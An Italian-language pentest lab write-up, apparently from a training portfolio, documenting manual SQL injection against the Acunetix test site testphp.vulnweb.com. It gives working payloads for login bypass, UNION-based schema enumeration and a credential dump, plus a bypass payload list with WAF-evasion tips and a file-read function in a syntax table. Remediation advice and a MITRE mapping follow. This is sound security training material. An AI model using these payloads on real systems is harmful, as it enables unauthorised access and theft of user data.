> [English](README.en.md) | **Italiano**

# Manual SQL Injection (SQLi)

> - **Fase:** Web Attack - SQL Injection (Manual)
> - **Visibilita:** Media - richieste HTTP con payload SQL nel parametro URL o nel corpo POST
> - **Prerequisiti:** Endpoint vulnerabile identificato, Burp Suite o browser per manipolare i parametri GET/POST
> - **Output:** Auth bypass, dump struttura database, esfiltrazione credenziali e dati sensibili, finding WEB-004

---

**ID Finding:** `WEB-004` | **Severity:** `Critico` | **CVSS v3.1:** 9.8

---

## 1 Executive Summary

Durante l'attività di Security Assessment eseguita sul target `testphp.vulnweb.com`, sono state individuate molteplici vulnerabilità critiche di tipo SQL Injection (SQLi).

Queste vulnerabilità permettono a un attaccante non autenticato di:

- Bypassare i meccanismi di autenticazione, accedendo come amministratore senza conoscere la password.
- Eseguire query arbitrarie sul database di backend.
- Esfiltrare l'intero contenuto del database, inclusi dati sensibili come credenziali utente, numeri di carte di credito e informazioni personali.

Il livello di rischio è valutato come CRITICO poiché la compromissione è totale (Confidentiality, Integrity, Availability).

---

## 2 Technical Analysis

#### Scenario A: Authentication Bypass (Login)

Il modulo di login non sanitizza correttamente l'input utente, permettendo l'iniezione di frammenti SQL che alterano la logica della query di autenticazione.

Endpoint: `http://testphp.vulnweb.com/login.php`

Vector: Campo `Username`

Payload (Exploit):

```SQL
admin' #
```

![](./img/Screenshot_2026-02-15_16_29_20.jpg)

Analisi Tecnica:

La query backend presunta è: `SELECT * FROM users WHERE user = '$username' AND pass = '$password'`;

Iniettando il payload, la query diventa:

```SQL
SELECT * FROM users WHERE user = 'admin' # AND pass = '...';
```

Il carattere `#` (hash) viene interpretato da MySQL come un commento, troncando il resto della query. Il controllo della password viene ignorato e l'attaccante ottiene l'accesso come utente `admin`.

Evidenza:

Accesso eseguito con successo alla dashboard amministrativa.

#### Scenario B: UNION Based Injection (Data Extraction)

L'endpoint `artists.php` tramite il parametro GET `artist` è vulnerabile a UNION-Based SQL Injection. Questo permette di unire i risultati della query originale con i risultati di una query iniettata dall'attaccante.

Endpoint: `http://testphp.vulnweb.com/artists.php?artist=1`

Fase 1: Reconnaissance & Fingerprinting

Per sfruttare la vulnerabilità, è stato necessario determinare il numero di colonne nella tabella corrente e identificare quali colonne vengono mostrate a video (reflected).

- Enumerazione Colonne: `ORDER BY 3` (Successo), `ORDER BY 4` (Errore). La tabella ha 3 colonne.
- Identificazione Output: Usando un ID inesistente (`-1`) e `UNION SELECT 1, 2, 3`, è stato identificato che la colonna 2 e 3 sono visibili all'utente.
- Fingerprinting: Estrazione versione e utente DB.

Payload:

```SQL
http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, version(), user()
```

![](./img/Screenshot_2026-02-15_16_55_38.jpg)

Evidenza:

Il server rivela la versione `8.0.22-0ubuntu` e l'utente `acuart@localhost`.

Scenario C: Database Dumping (The Kill Chain)

Sfruttando la vulnerabilità UNION, è stata eseguita l'esfiltrazione completa dello schema del database e dei dati sensibili.

#### Step 1: Enumerazione Tabelle

Accesso alla tabella di sistema `information_schema.tables` per elencare tutte le tabelle presenti.

Payload:

```SQL
http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()
```

![](./img/Screenshot_2026-02-15_16_36_04.jpg)

Risultato: `artists, carts, categ, featured, guestbook, pictures, products, users`.

La tabella `users` è stata identificata come target di alto valore.

#### Step 2: Enumerazione Colonne

Accesso a `information_schema.columns` per scoprire la struttura della tabella `users`.

Payload:

```SQL
http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users'
```

![](./img/Screenshot_2026-02-15_16_36_25.jpg)

Risultato: `uname, pass, cc, address, email, name, phone`.

#### Step 3: Data Exfiltration (Dump Finale)

Estrazione massiva di username e password dalla tabella users.

Payload:

```SQL
http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, group_concat(uname,0x3a,pass), 3 FROM users
```

![](./img/Screenshot_2026-02-15_17_04_06.jpg)

(Nota: `0x3a` è la rappresentazione esadecimale dei due punti `:` usati come separatore).

Evidenza (Loot):

Il server restituisce le credenziali in chiaro direttamente nella pagina, dimostrando la compromissione totale della riservatezza dei dati:

- Credenziali esatte: `test:test`
- (Eventuali altri utenti admin)

---

## 3 Remediation Strategy (Difesa)

Per mitigare le vulnerabilità identificate, si raccomanda l'adozione immediata delle seguenti pratiche di Secure Coding:

1. Prepared Statements (Obbligatorio):
    
Abbandonare la costruzione dinamica delle query tramite concatenazione di stringhe. Utilizzare Prepared Statements (es. `PDO` in PHP o `PreparedStatement` in Java) che separano rigorosamente la struttura SQL dai dati forniti dall'utente.

Esempio (PHP Secure):

```PHP
$stmt = $pdo->prepare('SELECT * FROM users WHERE user = :user');
$stmt->execute(['user' => $username]);
$user = $stmt->fetch();
```

2. Input Validation:

Implementare una validazione stretta (Allow-list) su tutti gli input.

- Se il parametro `artist` deve essere un numero, forzare il tipo a `Integer`.
- Rifiutare qualsiasi input che contenga caratteri non attesi.

3. Principio del Minimo Privilegio (Least Privilege):

L'utente del database utilizzato dall'applicazione web non dovrebbe avere accesso a tabelle di sistema (`information_schema`) o permessi di scrittura se non strettamente necessari.

4. WAF (Web Application Firewall):

Come misura di difesa in profondità, implementare un WAF per rilevare e bloccare pattern di attacco SQL comuni (es. `UNION SELECT`, `OR 1=1`).

---

## Analisi a Basso Livello: Meccanica della UNION Injection

### Come Funziona ORDER BY per Contare le Colonne

```
Query originale del server:
SELECT id, name, description FROM artists WHERE id = <INPUT>

Step 1: Trovare il numero di colonne
INPUT: 1 ORDER BY 1   -> OK (colonna 1 esiste)
INPUT: 1 ORDER BY 2   -> OK (colonna 2 esiste)
INPUT: 1 ORDER BY 3   -> OK (colonna 3 esiste)
INPUT: 1 ORDER BY 4   -> ERRORE ("Unknown column '4' in 'order clause'")
-> La query ha 3 colonne

Step 2: Identificare colonne visibili nell'HTML
INPUT: -1 UNION SELECT 'AAA','BBB','CCC'
-> L'ID -1 non esiste, quindi la query originale non restituisce righe
-> UNION aggiunge la riga ['AAA','BBB','CCC']
-> Se nella pagina appaiono 'BBB' e 'CCC' -> colonne 2 e 3 sono reflected

Step 3: Iniettare query nella colonna visibile
INPUT: -1 UNION SELECT 1,version(),user()
-> Colonna 2 mostra '8.0.22-0ubuntu' (versione MySQL)
-> Colonna 3 mostra 'acuart@localhost' (utente DB)
```

### MySQL vs PostgreSQL vs MSSQL: Differenze Sintattiche

| Operazione | MySQL | PostgreSQL | MSSQL |
| :--- | :--- | :--- | :--- |
| Commento | `#` o `-- -` | `--` | `--` |
| Concatenazione | `CONCAT(a,b)` | `a \|\| b` | `a + b` |
| Versione | `version()` | `version()` | `@@version` |
| Current DB | `database()` | `current_database()` | `db_name()` |
| Elenco tabelle | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` |
| Stacked queries | Si (con mysqli_multi_query) | Si | Si |
| File read | `LOAD_FILE('/etc/passwd')` | `pg_read_file()` | `OPENROWSET(BULK...)` |

### Auth Bypass: Varianti del Payload

```sql
-- Payload base
admin' #                    -- MySQL: commento con hash
admin'--                    -- MSSQL/PostgreSQL: commento con doppio trattino
admin' OR '1'='1            -- Universale: condizione sempre vera
' OR 1=1--                  -- Senza username specifico: primo utente (spesso admin)
' OR 1=1 LIMIT 1--         -- MySQL: forza un singolo risultato
admin'/*                    -- MySQL: commento multi-linea (bypass WAF)

-- Perche funziona 'admin' #':
Query originale: SELECT * FROM users WHERE user='$input' AND pass='$pass'
Dopo injection:  SELECT * FROM users WHERE user='admin' # AND pass='...'
                                                         ^--- tutto dopo # e ignorato
```

---

## Esperienza di Laboratorio

La progressione da Auth Bypass (Scenario A) a UNION Injection (Scenario B) a Database Dumping (Scenario C) ha dimostrato la kill chain completa della SQL injection manuale. Ogni fase dipende dalla precedente: il bypass conferma la vulnerabilita, la UNION identifica la struttura del database, e il dump estrae i dati. Saltare una fase (ad esempio tentare il dump senza conoscere il numero di colonne) produce errori che possono allertare i sistemi di difesa.

Il payload `0x3a` come separatore nel `group_concat()` e una tecnica operativa importante: usando il valore esadecimale dei due punti (`:`) si evita di introdurre apici o virgolette aggiuntivi nella query, che potrebbero rompere la sintassi SQL o essere bloccati da WAF basati su pattern matching. Analogamente, `0x0a` (newline) puo essere usato per formattare l'output multi-riga.

Il confronto con SQLMap (WEB-011) ha evidenziato il valore dell'injection manuale: SQLMap avrebbe completato il dump in 2 minuti, ma la comprensione dei passaggi manuali e essenziale per i casi in cui SQLMap fallisce (WAF aggressivo, injection in parametri non standard come header HTTP o cookie, o quando il DBMS non e supportato). La competenza manuale e anche cio che distingue un operatore da un "tool jockey" durante un colloquio tecnico.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Exploitation della SQL Injection sul form di login (`admin' #`) e sul parametro `artist` di `testphp.vulnweb.com` per ottenere accesso non autorizzato (WEB-004) |
| Discovery | Account Discovery: Local Account | `T1087.001` | Enumerazione degli utenti del database tramite `information_schema.tables` e recupero della struttura della tabella `users` (WEB-004) |
| Collection | Data from Information Repositories | `T1213` | Dump completo della tabella `users` contenente credenziali (`test:test`), email, numeri di telefono e dati di carte di credito tramite UNION-based injection (WEB-004) |

---

> **Nota:** Le attivita di SQL Injection manuale sono state condotte su `testphp.vulnweb.com`,
> ambiente di addestramento pubblico Acunetix. I dati estratti (credenziali, carte di credito)
> sono stati trattati come dati sensibili: visualizzati per documentare la vulnerabilita e poi
> scartati. In un engagement reale, il dump del database sarebbe consegnato al cliente in forma
> cifrata come prova di compromissione, classificato "Strictly Confidential".